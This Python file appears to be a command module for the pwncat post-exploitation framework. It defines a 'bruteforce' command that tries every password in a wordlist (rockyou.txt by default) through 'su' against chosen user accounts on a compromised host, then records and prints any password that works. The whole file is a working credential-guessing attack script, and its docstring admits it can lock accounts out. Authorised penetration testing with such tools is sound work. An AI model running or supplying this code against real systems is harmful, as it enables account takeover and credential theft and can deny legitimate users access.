#!/usr/bin/env python3
import argparse

from pwncat import util
from pwncat.commands.base import CommandDefinition, Complete, Parameter
import pwncat


class Command(CommandDefinition):
    """
    Attempt to bruteforce user password(s) from a dictionary. This will
    use the provided dictionary to attempt a local passwod bruteforce.
    
    WARNING: if automatic disabling of accounts is enabled, this **will**
                lock the targeted account out!
    """

    def get_remote_users(self):
        if pwncat.victim is not None:
            return pwncat.victim.users.keys()
        else:
            return []

    PROG = "bruteforce"
    ARGS = {
        "--dictionary,-d": Parameter(
            Complete.LOCAL_FILE,
            type=argparse.FileType("r"),
            help="The local dictionary to use for bruteforcing (default: kali rockyou)",
            default="/usr/share/wordlists/rockyou.txt",
        ),
        "--user,-u": Parameter(
            Complete.CHOICES,
            choices=get_remote_users,
            help="A local user to bruteforce; this can be passed multiple times for multiple users.",
            action="append",
            required=True,
            metavar="USERNAME",
        ),
    }

    def run(self, args):

        for name in args.user:
            args.dictionary.seek(0)
            for line in args.dictionary:
                line = line.strip()
                util.progress(f"bruteforcing {name}: {line}")

                try:
                    # Attempt the password
                    pwncat.victim.su(name, line, check=True)
                    pwncat.victim.users[name].password = line
                    util.success(f"user {name} has password {repr(line)}!")
                    break
                except PermissionError:
                    continue

        util.success("bruteforcing completed")
